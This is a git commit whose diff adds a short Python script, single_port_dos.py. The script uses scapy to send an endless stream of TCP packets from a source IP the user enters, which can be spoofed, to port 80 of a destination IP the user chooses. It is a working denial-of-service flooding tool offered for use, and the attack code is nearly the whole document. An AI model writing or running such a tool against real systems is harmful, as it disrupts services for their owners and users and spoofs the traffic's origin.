f886094f2ba4fc7d4dd909d3ee5e336c4c2b4754
José Lucas <jose.esbellute@gmail.com>
2022-02-27 14:32:32 -0300

    Updated single_port_dos

--- DoS/SinglePort/single_port_dos.py
+++ DoS/SinglePort/single_port_dos.py
@@ -1,1 +1,17 @@
-print("Primeiro commit");
+from scapy.all import *
+from scapy.layers.inet import IP
+from scapy.layers.inet import TCP
+
+
+src = input("IP Origem: ")
+dst = input("IP Destino: ")
+sport = int(input("Porta de origem: "))
+i = 1
+
+while True:
+    IP1 = IP(src=src, dst=dst)
+    TCP1 = TCP(sport=sport, dport=80)
+    pkt = IP1 / TCP1
+    send(pkt, inter=.001)
+    print("Enviado", i,  " Pacotes")
+    i = i + 1
